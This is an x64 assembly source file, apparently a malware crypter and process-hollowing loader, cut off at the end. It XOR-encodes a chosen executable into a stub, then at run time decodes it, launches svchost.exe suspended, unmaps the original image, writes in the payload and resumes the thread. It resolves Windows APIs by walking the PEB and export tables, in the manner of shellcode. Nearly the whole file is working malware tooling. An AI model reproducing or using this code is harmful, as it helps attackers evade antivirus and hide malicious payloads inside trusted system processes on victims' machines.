[BITS 64]
;**************
;* By:Teuzero *
;**************
global WinMain

section .BSS
	bool dq 1
	tamArq dq 0
	
	
section .data
	process dq "svchost.exe",0,0
	
    struc CONTEXT
       .P1Home:                                      resq 1
       .P2Home:                                      resq 1
       .P3Home:                                      resq 1
       .P4Home:                                      resq 1
       .P5Home:                                      resq 1
       .P6Home:                                      resq 1
       .ContextFlags:                                resd 1
       .MxCsr:                                       resd 1
       .SegCs:                                       resw 1
       .SegDs:                                       resw 1
       .SegEs:                                       resw 1
       .SegFs:                                       resw 1
       .SegGs:                                       resw 1
       .SegSs:                                       resw 1
       .EFlags:                                      resd 1
       .Dr0:                                         resq 1
       .Dr1:                                         resq 1
       .Dr2:                                         resq 1
       .Dr3:                                         resq 1
       .Dr6:                                         resq 1
       .Dr7:                                         resq 1
       .Rax:                                         resq 1
       .Rcx:                                         resq 1
       .Rdx:                                         resq 1
       .Rbx:                                         resq 1
       .Rsp:                                         resq 1
       .Rbp:                                         resq 1
       .Rsi:                                         resq 1
       .Rdi:                                         resq 1
       .R8:                                          resq 1
       .R9:                                          resq 1
       .R10:                                         resq 1
       .R11:                                         resq 1
       .R12:                                         resq 1
       .R13:                                         resq 1
       .R14:                                         resq 1
       .R15:                                         resq 1
       .Rip:                                         resq 1
    endstruc
	
    ctx istruc CONTEXT 
       at CONTEXT.P1Home,                            dq 0
       at CONTEXT.P2Home,                            dq 0
       at CONTEXT.P3Home,                            dq 0
       at CONTEXT.P4Home,                            dq 0
       at CONTEXT.P5Home,                            dq 0
       at CONTEXT.P6Home,                            dq 0
       at CONTEXT.ContextFlags,                      dd 0
       at CONTEXT.MxCsr,                             dd 0
       at CONTEXT.SegCs,                             dw 0
       at CONTEXT.SegDs,                             dw 0
       at CONTEXT.SegEs,                             dw 0
       at CONTEXT.SegFs,                             dw 0
       at CONTEXT.SegGs,                             dw 0
       at CONTEXT.SegSs,                             dw 0
       at CONTEXT.EFlags,                            dd 0
       at CONTEXT.Dr0,                               dq 0
       at CONTEXT.Dr1,                               dq 0
       at CONTEXT.Dr2,                               dq 0
       at CONTEXT.Dr3,                               dq 0
       at CONTEXT.Dr6,                               dq 0
       at CONTEXT.Dr7,                               dq 0
       at CONTEXT.Rax,                               dq 0
       at CONTEXT.Rcx,                               dq 0
       at CONTEXT.Rdx,                               dq 0
       at CONTEXT.Rbx,                               dq 0
       at CONTEXT.Rsp,                               dq 0
       at CONTEXT.Rbp,                               dq 0
       at CONTEXT.Rsi,                               dq 0
       at CONTEXT.Rdi,                               dq 0
       at CONTEXT.R8,                                dq 0
       at CONTEXT.R9,                                dq 0
       at CONTEXT.R10,                               dq 0
       at CONTEXT.R11,                               dq 0
       at CONTEXT.R12,                               dq 0
       at CONTEXT.R13,                               dq 0
       at CONTEXT.R14,                               dq 0
       at CONTEXT.R15,                               dq 0
       at CONTEXT.Rip,                               dq 0
	iend
	
    
   struc PROCESSINFO
        .hProcess                                    resd 2
        .hThread                                     resd 2
        .dwProcessId                                 resd 1
        .dwThreadId                                  resd 1
    endstruc
	
		
    ProcInfo istruc PROCESSINFO
        at PROCESSINFO.hProcess,                     dd 0
        at PROCESSINFO.hThread,                      dd 0
        at PROCESSINFO.dwProcessId,                  dw 0
        at PROCESSINFO.dwThreadId,                   dw 0
    iend
	
	
    struc STARTUPINFOA 
        .cb                                          resd 1
        .lpReserved                                  resb 8
        .lpDesktop                                   resb 8
        .lpTitle                                     resb 0xc
        .dwX                                         resd 1
        .dwY                                         resd 1
        .dwXSize                                     resd 1
        .dwYSize                                     resd 1
        .dwXCountChars                               resd 1
        .dwYCountChars                               resd 1
        .dwFillAttribute                             resd 1
        .dwFlags                                     resd 1
        .wShowWindow                                 resw 1
        .cbReserved2                                 resw 2
        .lpReserverd2                                resb 0xA
        .hStdInput                                   resd 2
        .hStadOutput                                 resd 2
        .hStdError                                   resd 2
    endstruc
	
    startup istruc STARTUPINFOA 
       at STARTUPINFOA.cb,                           dd 0
       at STARTUPINFOA.lpReserved,                   db 0
       at STARTUPINFOA.lpDesktop,                    db 0
       at STARTUPINFOA.lpTitle,                      db 0
       at STARTUPINFOA.dwX,                          dd 0
       at STARTUPINFOA.dwY,                          dd 0
       at STARTUPINFOA.dwXSize,                      dd 0
       at STARTUPINFOA.dwYSize,                      dd 0
       at STARTUPINFOA.dwXCountChars,                dd 0
       at STARTUPINFOA.dwYCountChars,                dd 0
       at STARTUPINFOA.dwFillAttribute,              dd 0
       at STARTUPINFOA.dwFlags,                      dd 0
       at STARTUPINFOA.wShowWindow,                  dw 0
       at STARTUPINFOA.cbReserved2,                  dw 0
       at STARTUPINFOA.lpReserverd2,                 db 0
       at STARTUPINFOA.hStdInput,                    dd 0
       at STARTUPINFOA.hStadOutput,                  dd 0
       at STARTUPINFOA.hStdError,                    dd 0
    iend  

    addressAlloc times 8                             dq 0
    TamArqProgram times 8                            dq 0
    TamArqTarget times 8                             dq 0
    bufferFileName times 32                          db 0
    Buffer times 800000                              dq 0
    GetSizeTarget times 8                            dq 0
    lpPebImageBase times 8                           dq 0
    allocex times 8                                  dd 0 
    alloc times 8                                    dd 0
    lpImageBase times 8                              dd 0
    VA times 8                                       dd 0
    PE times 8                                       dq 0
    ImageBase times 16                               dq 0
    NumSecion times 8                                db 0
    Ptrt times 8                                     dq 0
    void times 8                                     dq 0
    NumSection times 8                               dq 0
    address750 times 8                               dq 0
    pt20                                             dq 20
    Ptrt0                                            dq 0x00
    ptr17f0                                          dd 0x01
    address7ec                                       dd 0
    Ptrl                                             dq  0x0004000000000000
    NameArgv0 times 32 db 0
	tm times 8 dq 0

 section .codered 
 CodeRed times 800000                             db 0:

section .deccode	
	decCode:
	;SHELLCODE DE CONEXÃO ENCRIPTADO
	call Locate_kernel32	
	;Lookup CreateProcessA
	mov rax, 0x41737365636f
	push rax
	mov rax, 0x7250657461657243
	push rax
	mov rdx, rsp
	mov rcx, r8
	sub rsp, 0x30
	call R14
	mov r12, rax
	add rsp, 0x30
	add rsp, 0x10
	
	sub rsp, 0x238
	;Call CreateProcessA, CRIA PROCESSO SVCHOST SUSPENSO
	lea rdx,[ProcInfo+PROCESSINFO.hProcess]
	mov [rsp+0x48], rdx
	xor rdx,rdx
	lea rdx ,[startup+STARTUPINFOA.cb]
	xor rdi,rdi
	xor r9,r9
	mov r9, 0x1
	xor r11,r11
	mov r11, 0x04
	mov rdi, 0x0000000000000000
	mov [rsp+0x40], rdx 
	mov [rsp+0x38], rdi
	mov [rsp+0x30], rdi
	mov [rsp+0x28], r11
	mov [rsp+0x20], r9
	mov r9d, 0
	mov r8d, 0
	lea rdx, [process]
	mov ecx, 0
	xor r10,r10
	call r12
	add rsp, 0x238
	 	
	call Locate_kernel32
	call GetProcAddres

	;Lookup VirtualAlloc
	mov rax, "lloc"
	push rax
	mov rax, "VirtualA"
	push rax
	lea rdx, [rsp]
	mov rcx, r8
	sub rsp, 0x30
	sub rsp, 0x10
	call r14
	mov r12,rax
	add rsp, 0x30
	add rsp, 0x10
		
	;call VirtualAlloc
	mov r9d, 0x04
	mov r8d, 0x1000
	mov rdi, 0xC3500
	mov edx, edi
	mov ecx, 0x00
	call r12
	add rsp, 0x10
	mov rbx,rax
	mov rdi, rbx
	mov [alloc], rax
	
	mov rax, CodeRed
	xor rcx,rcx
	
	mov r9, [TamArqTarget]
	mov [tm], r9
	cmp r9, 0x00
	jnz DecArq
	
	mov r9, [tamArq]
	
	DecArq:
		mov rdx, [rax]
		xor rdx, 0xC0FFEE
		sub rdx, 0xc
		mov [rbx],rdx
		inc rbx
		inc rax
		inc RCX
		cmp rcx, r9
		jne DecArq
		
	mov rcx, [alloc]
	mov rax, [alloc]
	add rax, 0x3C
	xor rbx,RBX
	mov ebx, [eax]
	mov rax, RCX
	add rax, rbx
	add rax, 0x50
	mov ebx, [eax]
	mov [GetSizeTarget],ebx
	mov [lpImageBase], rcx
		
	mov rax, [lpImageBase]
	mov rcx, [lpImageBase]
	xor rdi,rdi
	add rax, 0x3c
	mov edi, [eax]
	mov rax, rcx
	add eax, edi
	mov [PE], rax
	add rax, 0x30
	xor rdi,Rdi
	mov rdi, [rax]
	mov [ImageBase], rdi
	
	call Locate_kernel32
	;lookup GetThreadContext
	call GetThreadCx
	
	;call GetThreadContext
	mov dword[ctx+CONTEXT.ContextFlags], 0x100002 
	mov rax, [ProcInfo+PROCESSINFO.hThread]
	lea rdx, [ctx+CONTEXT.P1Home]
	mov rcx, rax
	call r12
	
	;ReadProcessMemory
	call ReadProcessMemory
	
	;call ReadProcessMemory
	mov rax, [ctx+CONTEXT.Rdx]
	mov edx, 0x10
	add rax,rdx
	mov [void], rax
	
	mov rdx, [void]
	lea rcx, [lpPebImageBase]
	xor rdi,rdi
	mov [rsp+0x20], rdi
	mov r9d, 0x08
	mov r8, Rcx
	mov rcx,[ProcInfo+PROCESSINFO.hProcess]
	call r12
	
	mov rax, [lpImageBase]
	mov rcx, [lpImageBase]
	xor rdi,rdi
	add rax, 0x3c
	mov edi, [eax]
	mov rax, rcx
	add eax, edi
	mov [PE], rax
	add rax, 0x38
	xor rdi, rdi
	mov edi, [eax]
	mov [VA], eax
	
	mov rax, [lpPebImageBase]
	mov rdi , [ImageBase]
	cmp rax,Rdi
	jne lpAllocatedBase 
	call Locate_ntdll
	
	;ZwUnmapViewOfSection
	mov rax, "tion"
	push Rax
	mov rax, "iewOfSec"
	push Rax
	mov rax, "NtUnmapV"
	push Rax
	
	lea rdx, [rsp]
	mov rcx, r8
	sub rsp, 0x30
	call r14 
	mov r12, rax
	add rsp, 0x30
	add rsp, 0x10
	
	mov rcx, [ProcInfo+PROCESSINFO.hProcess]
	mov rdx, [lpPebImageBase]
	call rax
	
	lpAllocatedBase:
		call Locate_kernel32
		call LoadLibrary
		mov rbx,rcx
		
		loadKernelbase:
			 ;Load kernelbase.dll
			mov rax, "se.dll"     
			push rax
			mov rax, "kernelba"
			push rax
			mov rcx, rsp
			sub rsp, 0x30
			call rsi
			mov r15,rax
			add rsp, 0x30
			add rsp, 0x10
			
			call Locate_kernel32
			;Lookup VirtualAllocEx
			call VirtualAllocEx
			;call VirtualAllocEx
			mov rax, [PE]
			mov eax, dword[rax+0x50]
			mov ecx,eax
			mov rdx, [ImageBase]
			mov r8d, [GetSizeTarget]
			mov r9d, 0x3000
			mov [rsp+0x20], dword 0x40
			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
			mov rdi, r13
			call r12
			mov [allocex],rax
			
			mov rax, [allocex]
			test rax,Rax
			sete al
			test al, al
			je pulo 
			
			pulo:
			mov rax,  [allocex]
			cmp rax, [lpPebImageBase]
			je Decisao1
				
			call Locate_kernel32 
			sub rsp, 0x80
			;Lookup WriteProcess
			call WriteProcess
			lea r8, [allocex]
			mov rdx, [void]
			lea  rcx,[pt20]
			mov [rsp+0x20], Rcx
			mov r9d, 8
			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
			
			call r12
			add rsp, 0x80
			
			Decisao1:
			mov rax, [PE]
			mov word[rax+0x5C], 2 ;Subsystem
			mov rax, [ImageBase]
			mov rdx, [ImageBase]
			cmp rdx,Rax
			je Writable
			
			mov rax, [PE]
			movzx eax, word[rax+0x16]
			movzx eax, ax
			and eax, 1
			test eax,eax
			je Pulo2
			
			Pulo2:
								
	Writable:
			call Locate_kernel32
			mov rax,  [PE]
			mov eax, dword[rax+0x28]
			mov edx,eax
			mov rax, [ImageBase]
			add rax,rdx
			mov[ctx+CONTEXT.Rcx], rax
				
			call Locate_kernel32
			call LoadLibrary
			;call LoadLibrary
			mov r13, r15
			;Load kernelbase.dll
			mov rax, "se.dll"     
			push rax
			mov rax, "kernelba"
			push rax
			mov rcx, rsp
			sub rsp, 0x30
			call rsi
			mov r15,rax
			add rsp, 0x30
			add rsp, 0x10
			call Locate_kernel32
			;lookup SetThreadContext
			sub rsp, 0x80
			mov rax, "dContext"
			push Rax
			mov rax, "SetThrea" 
			push rax
			mov [rsp+0x10], dword 0x00
			lea rdx, [rsp]
			mov rcx, r8
			sub rsp, 0x30
			call R14
			add rsp,0x30
			add rsp,0x10
			add rsp, 0x80
			mov r12, rax
		
			mov rax, [ProcInfo+PROCESSINFO.hThread]
			lea rdx, [ctx+CONTEXT.P1Home]
			mov rcx, Rax
			call r12
			
			call Locate_kernel32
			;Lookup WriteProcess
			call WriteProcess
			;call WriteProcessMemory
			sub rsp, 0x80
			mov rax, [PE]
			mov eax, dword[rax+0x54]
			mov r9d,eax
			mov r8, [lpImageBase]
			mov rdx, [ImageBase]
			xor rbx,Rbx
			push rbx
			mov [rsp+0x20],rsp
			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
			call r12
			add rsp, 0x80
			mov rbp, rax
			add rsp, 0x08
				
			call Locate_kernel32
			;Lookup VirtualProectEx
			sub rsp, 0x80
			call VirtualProectEx
			mov rax, [PE]
			mov eax, dword[rax+0x54]
			mov r8d, eax
			mov rdx, [ImageBase]
			push Rcx
			mov rcx,rsp
			mov [rsp+0x20],Rcx
			mov r9d, 0x02
			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
			call r12
			add rsp, 0x80
			add rsp, 0x08
			
			mov rax, [lpImageBase]
			mov eax, [rax+0x3c]
			movsxd rdx,eax
			mov rax, [lpImageBase]
			add rax,Rdx
			add rax, 0x108
			mov [address750], rax
			mov [NumSection], dword 0x00
			jmp Final
		
		Delta:
			call Locate_kernel32
			sub rsp, 0x80
			;Lookup WriteProcess
			call WriteProcess
			mov eax,[NumSection]
			movsxd rdx,eax
			mov rax, RDX
			shl rax,0x2
			add rax,Rdx
			shl rax, 0x3
			mov rdx, Rax
			mov rax, [address750]
			add rax, Rdx
			mov eax, dword[rax+0x10]
			mov r9d,eax
			mov eax, dword [NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax,0x2
			add rax,Rdx
			shl rax, 0x3
			mov rdx,Rax
			mov rax, [address750]
			add rax,Rdx
			mov eax, dword[rax+0x14]
			mov edx,eax
			mov rax, [lpImageBase]
			add rax,Rdx
			mov r8, Rax
			mov eax, dword[NumSection]
			movsxd rdx, eax
			mov rax, Rdx
			shl rax, 0x2
			add rax,Rdx
			shl rax, 0x3
			mov rdx,Rax
			mov rax, [address750]
			add rax,Rdx
			mov eax, dword[rax+0xc]
			mov edx,eax
			mov rax, [ImageBase]
			add rax,Rdx
			mov rcx,Rax
			mov rax, [ProcInfo+PROCESSINFO.hProcess]
			lea rdx, [Ptrl]
			mov [rsp+0x20],rdx
			mov rdx,Rcx
			mov rcx, Rax
			call R12
			add rsp, 0x80
			
			mov dword[ptr17f0], 0
			mov rax, [PE]
			movzx eax, word[rax+0x6]
			movzx eax, ax
			sub eax, 0x01
			cmp eax, [NumSection]
			
			jne Decisao2
			mov rax, [PE]
			mov ecx, [rax+0x50]
			mov eax, dword[NumSection]
			movsxd rdx,eax
			mov rax,rdx
			shl rax, 0x02
			add rax,Rdx
			shl rax, 0x3
			mov rdx, Rax
			mov rax, [address750]
			add rax,Rdx
			mov eax, dword [rax+0xc]
			sub ecx,eax
			mov eax,ecx
			mov dword[NumSection], eax
			jmp D4
		Decisao2:
			mov eax, dword[NumSection]
			cdqe
			lea rdx, [rax+1]
			mov rax,Rdx
			shl rax,0x02
			add rax,Rdx
			mov rax, [address750]
			add rax,Rdx
			mov ecx, dword [rax+0xC]
			mov eax, dword[NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax, 0x02
			add rax,Rdx
			shl rax,0x03
			mov rdx,Rax
			mov rax, [address750]
			add rax,Rdx
			mov eax, dword[rax+0xc]
			sub ecx,eax
			mov eax, ecx
			mov dword[ptr17f0], eax
			
		D4:
			mov dword[address7ec], 0
			mov eax, dword[NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax, 0x02
			add rax,Rdx
			shl rax, 0x03
			mov rdx,Rax
			mov rax, [address750]
			add rax, Rdx
			mov eax, dword[rax+0x24]
			and eax,  0x20000000
			test eax, eax 
			je D5
			
			mov eax, [NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax,0x02
			add rax,Rdx
			shl rax, 0x03
			mov rdx,Rax
			mov rax, [address750]
			add rax,rdx
			mov eax, dword[rax+0x24]
			and eax , 0x40000000
			test eax,eax
			je D5
			
			mov eax, dword[NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax, 0x02
			add rax,Rdx
			shl rax, 0x03
			mov rdx,Rax
			mov rax, [address750]
			add rax,Rdx
			mov eax, dword[rax+0x24]
			test eax,eax
			jns D5
			mov dword[address7ec],0x40
			jmp jmpAlloc
		D5:
			mov eax, dword[NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax, 0x02
			add rax, Rdx
			shl rax, 0x03
			mov rdx,Rax
			mov rax, [address750]
			add rax,Rdx
			mov eax, dword[rax+0x24]
			and eax, 0x20000000
			test eax,eax
			
			je D6
			mov eax, dword[NumSection]
			movsxd rdx,eax
			mov rax,Rdx
			shl rax, 0x02
			add rax,Rdx
			shl rax, 0x03
			mov rdx,Rax
			mov rax, [address750]
			add rax, Rdx
			mov eax, dword[rax+0x24]
			and eax, 0x40000000
			
			test eax,eax
			je D6
			mov dword[address7ec],0x20
			jmp jmpAlloc
		D6:
			
		jmpAlloc:	
		call Locate_kernel32
		;Lookup VirtualProectEx
		call VirtualProectEx
		sub rsp, 0x80
		mov ecx, dword[ptr17f0]
		mov eax, dword[NumSection]
		movsxd rdx,eax
		mov rax,Rdx
		shl rax, 0x2
		add rax,Rdx
		shl rax,0x3
		mov rdx,Rax
		mov rax, [address750]
		add rax, Rdx
		mov eax, dword [rax+0xc]
		mov edx,eax
		mov rax, [ImageBase]
		add rax,Rdx
		mov r10,Rax
		mov rax, [ProcInfo+PROCESSINFO.hProcess]
		mov r8d, dword[address7ec]
		push rbx
		mov rbx,rsp
		mov [rsp+0x20],rbx
		mov r9d, r8d
		mov r8, Rcx
		mov rdx,r10
		mov rcx, Rax
		call r12
		add rsp, 0x80
		add dword [NumSection], 0x1
		
	Final:
		mov rax, [PE]
		movzx eax, word[rax+0x06]
		movzx eax, ax
		cmp eax, [NumSection]	
		jg Delta
		xor rbx,Rbx
		mov bx, 0x08
		mul	bx
		add rsp, rax
			
		call Locate_kernel32 
		mov rax, "read"
		push rax
		mov rax, "ResumeTh"
		push rax
		lea rdx, [rsp]
		mov rcx, r8
		sub rsp, 0x30
		call r14
		add rsp, 0x30
		add rsp, 0x10
		
		mov r12, rax
		;call ResumeTheread
		mov rax, [ProcInfo+PROCESSINFO.hThread]
		mov rcx, rax
		call R12
		
		mov rax, [bool]
		cmp rax, 0
		jle Exit
			
		call Locate_kernel32
		call LoadLibraryA
		call LoadMsvcrt	
		
		sub rsp, 0x20
		mov rax, "T007.exe"
		push Rax
		mov [rsp+0x8], byte 0x00
		mov [bufferFileName], rsp
		call OpenFile
		add rsp, 0x20
					
		call Locate_kernel32
		call LoadLibraryA
		call LoadMsvcrt	
		
		add rsp, 0x08
		
		;Lookup fopen
		mov rax, "fopen"
		push rax
		lea rdx, [rsp]
		mov rcx, r15
		sub rsp, 0x30
		call r14
		mov r12,rax
		add rsp, 0x30
		add rsp, 0x08

		;Abre arquivo
		mov rax, "Tx0.exe"
		push rax
		lea rcx, [rsp]
		mov rax, "wb+"
		push rax
		lea rdx, [rsp]
		sub rsp, 0x30
		call r12
		add rsp, 0x30
		add rsp, 0x10
		mov rbp,rax
				
		;Lookup fwrite
		mov rax, "fwrite"
		push rax
		lea rdx, [rsp]
		mov rcx, r15
		sub rsp, 0x30
		call r14
		mov r12, rax
		add rsp, 0x30
				
		mov rax, [addressAlloc]
		add rax, 0x400
		mov [rax], byte 0x00
		sub rax, 0x400
		add rax, 0xC3C00
		add rax, 0x36
		mov [rax], dword 0x240
		sub rax, 0x36
		add rax, 0xA7
		mov [rax], dword 0x240
		sub rax, 0xA7
		sub rax, 0xC3C00
		
		add rax, 0x400
		add rax, 0x08
		xor rdx,Rdx
		mov rdx, [tm]
		mov [rax],dword  edx
		
		sub rax, 0x400
		sub rax, 0x08
		
		
		mov rax, [addressAlloc]
		add rax, 0x600
		
		xor rbx, Rbx
		mov rbx, CodeRed
		xor rcx,rcx
		xor r11, r11
		mov r9, [TamArqTarget]
		
		DecArqq:
			mov r11, [rbx]
			mov [rax],r11
			inc r11
			inc rbx
			inc rax
			dec r9
			cmp rcx, r9
			jne DecArqq
		
		mov rax, [addressAlloc]
		
		;call fwrite
		xor r8,R8
		mov r8, [TamArqProgram]
		mov edx, r8d
		mov r9, rbp
		mov r8d, 0x01
		mov rcx, rax
		sub rsp, 0x30
		call r12
		add rsp, 0x30
		add rsp, 0x08
		
		;Lookup fclose
		mov rax, "fclose"
		push rax
		lea rdx, [rsp]
		mov rcx, r15
		sub rsp, 0x30
		call r14
		mov r12, rax
		add rsp, 0x30
		add rsp, 0x08

		;call fclose
		sub rsp,0x30
		mov rcx, rbp
		call r12
		add rsp, 0x30
ret
					
section .text
WinMain:
    Start:
	;***************
	;**** START ****
	;***************
	;* By: Teuzero *
	;***************
	;add rsp, 0xfffffffffffffdf8; # Bytes Vazios

	; Obtem o endereço base do kernel32.dll 
	call Locate_kernel32
	call IAT
	call FinFunctionGetProcAddress
	call LoadLibraryA
	call LoadMsvcrt
	mov rax, [bool]
	cmp rax, 0x1
	jnz dec
	call PrintMsgConsole
	call PegaNomeDoaquivo
	
	lea rax, [rsp+0x10]
	
	mov [bufferFileName], rax
	call OpenFile
	mov rbp,[addressAlloc]
	mov r10, rbp ; Arquivo alvo
	
	mov rax, [TamArqProgram]
	mov [TamArqTarget], rax
	xor r10,r10
	call Locate_kernel32
	
	
	call VirtualProect
	;CALL VirtualProtect 
	mov r10, [TamArqTarget]
	add r10, 0x77
	sub rsp, 0x30
	push rsp
	mov r9, rsp
	mov r8d, 0x40
	mov rdx, r10
	mov ecx, CodeRed
	sub rsp, 0x30
	call rsi
	add rsp, 0x30

	mov ecx, 0
	mov rax, CodeRed
	mov rdx,[TamArqTarget]
	xor rcx,rcx
	WriteSecion:
		mov rbx, [rbp]
		add rbx, 0xc
		xor rbx, 0xC0FFEE
		mov [rax], rbx
		inc rax
		inc rbp
		dec rdx
		cmp rcx,rdx
		jne WriteSecion 
	
	dec:
		call decCode
	
	Exit:   
		call Locate_kernel32
		;lookup ExitProcess
		mov rax, "ess"
		push rax
		mov rax, "ExitProc"
		push rax
		lea rdx, [rsp]
		mov rcx, r8
		sub rsp, 0x30
		call r14
		add rsp, 0x30
		add rsp, 0x10
		mov r12 ,rax
		call r12
	;END
ret
;***************
;*     AND     *
;***************
	
	
PrintMsgConsole:
	; Lookup printf
	mov rax, "printf"
	push rax
	mov rdx, rsp
	mov rcx, r15
	sub rsp, 0x30
	call r14
	add rsp, 0x30
	add rsp, 0x08
	mov r12, rax

	; call printf
	mov rax, ":"
	push rax
	mov rax, "[+] File"
	push rax
	lea rcx, [rsp]
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	add rsp, 0x10
retn

PegaNomeDoaquivo:
	; Lookup scanf
	mov rax, "scanf"
	push rax
	mov rdx,rsp
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12, rax
	add rsp, 0x30

	; call scanf
	lea rax, [rsp+0x20]
	mov rdx, rax
	mov rax, "%s"
	push rax
	lea rcx, [rsp]
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	add rsp, 0x10
ret

OpenFile:
	;Lookup fopen
	mov rax, "fopen"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12,rax
	add rsp, 0x30

	;Abre arquivo
	
	mov rax, [bufferFileName]
	lea rcx, [rax]
	mov rax, "rb"
	push rax
	lea rdx, [rsp]
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	mov rbx,rax
	add rsp, 0x10

LocomoveParaOFimDoarquivo:
	;Lookup fseek
	mov rax, "fseek"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12,rax
	add rsp, 0x30

	;call fseek
	mov rcx, rbx
	mov r8d, dword 0x02        
	mov edx, dword 0x00
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	add rsp, 0x08
	
GetSizeFile:
	;Lookup ftell
	mov rax, "ftell"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	add rsp, 0x30
	mov r12,rax

	;call ftell
	mov rcx, rbx
	sub rsp, 0x30
	call r12
	mov [TamArqProgram], rax
	add rsp,0x30
	mov rsi,rax
	add rsp, 0x08

AlocaEspacoEmUmEndereco:
	;Lookup malloc
	mov rax, "malloc"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12,rax
	add rsp, 0x30

	;call malloc
	mov rcx, rsi
	sub rsp, 0x30
	call r12
	mov [addressAlloc], rax
	mov rdi, rax
	add rsp,0x30
	add rsp, 0x08

MoveParaInicioDoArquivo:
	;Lookup rewind
	mov rax, "rewind"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12, rax
	add rsp, 0x30

	;call rewind
	mov rcx, rbx
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	add rsp, 0x08

GravaOPEdoArquivoNoEnderecoAlocadoPorMalloc:
	;Lookup fread
	mov rax, "fread"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12, rax
	add rsp, 0x30

	;call fread
	mov edx,esi
	mov r9, rbx
	mov r8d, 0x01
	mov rcx, rdi
	sub rsp, 0x30
	call r12
	add rsp, 0x30
	add rsp, 0x08

FechaArquivo:
	;Lookup fclose
	mov rax, "fclose"
	push rax
	lea rdx, [rsp]
	mov rcx, r15
	sub rsp, 0x30
	call r14
	mov r12, rax
	add rsp, 0x30

	;call fclose
	sub rsp,0x30
	mov rcx, rbx
	call r12
	add rsp, 0x30
	add rsp, 0x08
 ret
         

;********************************
;* ABAIXO BUSCA POR FUNÇÕES     *
;********************************
; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
FinFunctionGetProcAddress:
	mov rcx, r10; # Set loop counter
	
	kernel32findfunction:  
		jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
		xor ebx,ebx; # Zera EBX para ser usada
		mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
		add rbx, r8; # RBX = Nome da funcao VMA
		dec rcx; # Decrementa o loop em 1
		mov rax, 0x41636f7250746547; # GetProcA
		cmp [rbx], rax; # checa se rbx é igual a  GetProcA
		jnz kernel32findfunction;  

	; Encontra o endereço da função de GetProcessAddress
	FunctionNameFound:                 
		; We found our target
		xor r11, r11; 
		mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
		add r11, r8; # AddressOfNameOrdinals VMA
		; Get the function ordinal from AddressOfNameOrdinals
		inc rcx; 
		mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
		; Get function address from AddressOfFunctions
		xor r11, r11; 
		mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
		add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
		mov eax, [r11+4+r13*4]; # Get the function RVA.
		add rax, r8; # Add base address to function RVA
		mov r14, rax; # GetProcAddress to R14
ret

LoadLibraryA:
   ; pega o endereco LoadLibraryA usando GetProcAddress
	mov rcx, 0x41797261;  
	push rcx;  
	mov rcx, 0x7262694c64616f4c;  
	push rcx;  
	mov rdx, rsp; # joga o ponteiro da string LoadLibraryA para RDX
	mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
	sub rsp, 0x30; # Make some room on the stack
	call r14; # Call GetProcessAddress
	add rsp, 0x30; # Remove espaço alocado na pilha
	add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
	mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
ret

LoadMsvcrt:
	; Load msvcrt.dll
	mov rax, "ll"
	push rax
	mov rax, "msvcrt.d"
	push rax
	mov rcx, rsp
	sub rsp, 0x30
	call rsi
	mov r15,rax
	add rsp, 0x30
	add rsp, 0x10
ret		 

GetProcAddres:
	xor r11,r11
	xor r13,r13
	xor rcx, rcx; # Zera RCX
	mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
	mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
	mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
	lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
	xchg rax, rsi; # troca RAX,RSI
	lodsq; # Load qword at address (R)SI into RAX
	mov rbx, [rax + 0x20] ; # RBX = Kernel32 base address
	mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
	  
	; Código para chegar na tabela de endereco de exportacao
	mov ebx, [rbx+0x3C]; # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
	add rbx, r8; # Add defrerenced signature offset to kernel32 base. Store in RBX.
	mov r12, 0x88FFFFF;      
	shr r12, 0x14; 
	mov edx, [rbx+r12]; # Offset from PE32 Signature to Export Address Table (NULL BYTE)
	add rdx, r8; # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
	mov r10d, [rdx+0x14]; # numero de funcoes
	xor r11, r11; # Zera R11 para ser usado 
	mov r11d, [rdx+0x20]; # AddressOfNames RVA
	add r11, r8; # AddressOfNames VMA

FinFunctionGetProcAddress2:
	mov rcx, r10; # Set loop counter
	kernel32findfunction2:  
		jecxz FunctionNameFound2; # Percorra esta função até encontrarmos GetProcA
		xor ebx,ebx; # Zera EBX para ser usada
